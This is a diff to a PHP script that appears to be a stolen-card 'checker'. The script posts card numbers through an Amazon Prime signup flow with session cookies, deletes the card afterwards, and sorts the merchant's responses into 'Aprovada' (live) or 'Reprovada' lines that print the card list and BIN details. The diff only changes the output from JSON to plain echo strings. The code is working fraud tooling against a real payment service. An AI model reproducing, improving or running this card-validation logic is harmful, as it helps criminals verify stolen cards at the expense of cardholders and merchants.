@@ -991,28 +991,28 @@ if (is_numeric($cc) && (strlen($cc) == 16 || strlen($cc) == 15)) {
         return $post_verify3 = curl_exec($curl);
     }
 
-    $mesgirespfim = prime_teste($cookiesa, $last, $datajson);
-    deletecard($datajson);
+   $mesgirespfim = prime_teste($cookiesa, $last, $datajson);
+deletecard($datajson);
 
-    if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
-        echo json_encode(array("erro" => "false", "response" => time(), "dados" => ["1" => $lista, "2" => "Aprovada | Authorised (00)", "3" => $cardInfo]));
-        exit();
-    } else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
-        echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "Reprovada | PAGAMENTO RECUSADO", "3" => $cardInfo]));
-        exit();
-    } else if (strpos($mesgirespfim, 'HARDVET_VERIFICATION_FAILED') !== false || strpos($mesgirespfim, 'hardVet') !== false || strpos($mesgirespfim, "HARDVET_VERIFICATION_FAILED") !== false) {
-        echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "Reprovada | PAGAMENTO RECUSADO", "3" => $cardInfo]));
-        exit();
-    } elseif (strpos($mesgirespfim, 'There was an error validating your payment method') !== false || strpos($mesgirespfim, "There was an error validating your payment method. Please update or add a new payment method and try again") !== false) {
-		        echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "Reprovada | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO", "3" => $cardInfo]));
-        exit();
-    } else {
-        echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "Reprovada | ERRO DESCONHECIDO", "3" => $cardInfo]));
-        exit();
-    }
+if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
+    echo "Aprovada $lista | Authorised $cardInfo usa";
+    exit();
+} else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
+    echo "Reprovada $lista | PAGAMENTO RECUSADO $cardInfo usa";
+    exit();
+} else if (strpos($mesgirespfim, 'HARDVET_VERIFICATION_FAILED') !== false || strpos($mesgirespfim, 'hardVet') !== false || strpos($mesgirespfim, "HARDVET_VERIFICATION_FAILED") !== false) {
+    echo "Reprovada $lista | PAGAMENTO RECUSADO $cardInfo usa";
+    exit();
+} elseif (strpos($mesgirespfim, 'There was an error validating your payment method') !== false || strpos($mesgirespfim, "There was an error validating your payment method. Please update or add a new payment method and try again") !== false) {
+    echo "Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO $cardInfo usa";
+    exit();
+} else {
+    echo "Reprovada $lista | ERRO DESCONHECIDO $cardInfo usa";
+    exit();
+}
 } else {
     $cardInfo = bin($bin);
-    echo json_encode(array("erro" => "true", "response" => time(), "dados" => ["1" => $lista, "2" => "CARTÃO INVÁLIDO", "3" => $cardInfo]));
+    echo "Reprovada $lista | CARTÃO INVÁLIDO $cardInfo usa";
     header('HTTP/1.1 200 OK');
     exit();
 }
